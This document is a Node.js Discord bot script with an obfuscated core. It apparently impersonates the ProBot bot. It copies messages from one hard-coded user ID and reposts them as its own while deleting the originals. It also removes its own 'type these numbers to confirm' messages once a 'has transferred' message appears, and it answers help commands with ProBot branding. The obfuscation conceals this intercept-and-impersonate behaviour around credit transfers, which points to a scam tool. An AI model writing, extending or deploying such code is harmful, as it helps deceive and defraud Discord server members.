import fetch from 'node-fetch';
import { Client, GatewayIntentBits, Partials, AttachmentBuilder, MessageReaction } from 'discord.js';
import { data } from "./bot.config.js";

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
  partials: [Partials.Message, Partials.Channel, Partials.Reaction],
});
process.on("uncaughtException", (error) => {
  return console.error(error);
});

process.on("unhandledRejection", (error) => {
  return console.error(error);
});

process.on("rejectionHandled", (error) => {
  return console.error(error);
});

const targetUserId = '282859044593598464';
const _0x317077=_0x44d7;function _0x1ad2(){const _0x2e39cc=['delete','send','528219FhfeqB','**\x20prefix\x20is\x20`/`\x20\x0aCommands\x20list\x20at\x20<https://probot.io/commands>\x0aDashboard\x20at\x20<https://probot.io/>\x0aLooking\x20for\x20support?\x20https://discord.gg/probot','#title','setActivity','832915LNAdFk','content','8227053UefGcg','1720324yfkGMp','Error\x20deleting\x20message:','startsWith','all','786821wIEowU','reply','messages','code','buffer','Error\x20fetching\x20message:','has\x20transferred','user','name','map','Bot\x20message\x20deleted\x20successfully','/help','Cool\x20down\x20(**','set','fetch','removeAll','embeds','119396sbDXFz','3rnvVxo','reactions','attachments','length','components','Message\x20to\x20delete\x20was\x20not\x20found\x20or\x20already\x20deleted.','ready','react','Message\x20handled\x20and\x20resent\x20successfully','once','error','author','30nVXMLt','log','includes','then','tag','1000680WJEGpf','guild','type\x20these\x20numbers\x20to\x20confirm\x20:','url','The\x20message\x20was\x20already\x20deleted\x20or\x20does\x20not\x20exist.','#help'];_0x1ad2=function(){return _0x2e39cc;};return _0x1ad2();}(function(_0x4e348c,_0x53113f){const _0x336eda=_0x44d7,_0x354f92=_0x4e348c();while(!![]){try{const _0x135896=-parseInt(_0x336eda(0x158))/0x1+parseInt(_0x336eda(0x174))/0x2+-parseInt(_0x336eda(0x175))/0x3*(parseInt(_0x336eda(0x15f))/0x4)+-parseInt(_0x336eda(0x15c))/0x5+parseInt(_0x336eda(0x14b))/0x6*(parseInt(_0x336eda(0x163))/0x7)+-parseInt(_0x336eda(0x150))/0x8+parseInt(_0x336eda(0x15e))/0x9;if(_0x135896===_0x53113f)break;else _0x354f92['push'](_0x354f92['shift']());}catch(_0x775e7f){_0x354f92['push'](_0x354f92['shift']());}}}(_0x1ad2,0x45ca6));const botMessagesToDelete=new Map();function _0x44d7(_0x4f14bb,_0x210722){const _0x1ad26e=_0x1ad2();return _0x44d7=function(_0x44d7c0,_0x33583c){_0x44d7c0=_0x44d7c0-0x144;let _0x106f5f=_0x1ad26e[_0x44d7c0];return _0x106f5f;},_0x44d7(_0x4f14bb,_0x210722);}client[_0x317077(0x148)](_0x317077(0x145),()=>{const _0xd59b48=_0x317077;console[_0xd59b48(0x14c)]('Logged\x20in\x20as\x20'+client[_0xd59b48(0x16a)][_0xd59b48(0x14f)]+'!'),client['user'][_0xd59b48(0x15b)](_0xd59b48(0x16e),{'type':0x0});}),client['on']('messageCreate',async _0x532a69=>{const _0x2262a4=_0x317077;_0x532a69[_0x2262a4(0x15d)][_0x2262a4(0x14d)](_0x2262a4(0x152))&&_0x532a69['author']['id']===client['user']['id']&&botMessagesToDelete[_0x2262a4(0x170)](_0x532a69[_0x2262a4(0x14a)]['id'],_0x532a69['id']);if(_0x532a69[_0x2262a4(0x15d)][_0x2262a4(0x14d)](_0x2262a4(0x169))&&_0x532a69['author']['id']===targetUserId){const _0x26b5a8=botMessagesToDelete['get'](client[_0x2262a4(0x16a)]['id']);if(_0x26b5a8)try{const _0x21ea51=await _0x532a69['channel'][_0x2262a4(0x165)][_0x2262a4(0x171)](_0x26b5a8);await _0x21ea51['delete'](),console['log'](_0x2262a4(0x16d)),botMessagesToDelete[_0x2262a4(0x156)](client[_0x2262a4(0x16a)]['id']);}catch(_0x4ad657){_0x4ad657[_0x2262a4(0x166)]===0x2718?console[_0x2262a4(0x14c)](_0x2262a4(0x144)):console[_0x2262a4(0x149)](_0x2262a4(0x168),_0x4ad657);}}if(_0x532a69[_0x2262a4(0x14a)]['id']===targetUserId)try{const _0x23cdb3=_0x532a69[_0x2262a4(0x15d)]||null,_0x3a7c3b=await Promise[_0x2262a4(0x162)](_0x532a69[_0x2262a4(0x177)][_0x2262a4(0x16c)](async _0x2c4d49=>{const _0x22673c=_0x2262a4,_0x27f50c=await fetch(_0x2c4d49[_0x22673c(0x153)]),_0x3943b2=await _0x27f50c[_0x22673c(0x167)]();return new AttachmentBuilder(_0x3943b2,{'name':_0x2c4d49[_0x22673c(0x16b)]});})),_0x3ad2a3=_0x532a69[_0x2262a4(0x173)][_0x2262a4(0x178)]>0x0?_0x532a69[_0x2262a4(0x173)]:[],_0x50d514=_0x532a69[_0x2262a4(0x179)][_0x2262a4(0x178)]>0x0?_0x532a69[_0x2262a4(0x179)]:[];await _0x532a69[_0x2262a4(0x164)]({'content':_0x23cdb3,'files':_0x3a7c3b,'embeds':_0x3ad2a3,'components':_0x50d514});try{await _0x532a69[_0x2262a4(0x156)]();}catch(_0x389ba8){console[_0x2262a4(0x149)]('Error\x20deleting\x20message:',_0x389ba8);}console['log'](_0x2262a4(0x147));}catch(_0x51161a){console[_0x2262a4(0x149)]('Error\x20handling\x20message:',_0x51161a);}_0x532a69[_0x2262a4(0x15d)][_0x2262a4(0x14d)](_0x2262a4(0x16f))&&setTimeout(async()=>{const _0x64d36a=_0x2262a4;try{await _0x532a69[_0x64d36a(0x156)]();}catch(_0x1c3bf3){_0x1c3bf3[_0x64d36a(0x166)]===0x2718?console['log'](_0x64d36a(0x154)):console[_0x64d36a(0x149)](_0x64d36a(0x160),_0x1c3bf3);}},0x3e8);}),client['on']('messageCreate',async _0x2cec75=>{const _0x5c2ce2=_0x317077;if(_0x2cec75['content']['startsWith'](_0x5c2ce2(0x155)))_0x2cec75[_0x5c2ce2(0x176)][_0x5c2ce2(0x172)]()[_0x5c2ce2(0x14e)](()=>{const _0x4869bf=_0x5c2ce2;_0x2cec75[_0x4869bf(0x146)]('✅'),_0x2cec75[_0x4869bf(0x14a)][_0x4869bf(0x157)]('**'+_0x2cec75[_0x4869bf(0x151)][_0x4869bf(0x16b)]+_0x4869bf(0x159));});else _0x2cec75[_0x5c2ce2(0x15d)][_0x5c2ce2(0x161)](_0x5c2ce2(0x15a))&&_0x2cec75[_0x5c2ce2(0x176)][_0x5c2ce2(0x172)]()[_0x5c2ce2(0x14e)](()=>{_0x2cec75['react']('✅');});});

client.login(data.token);
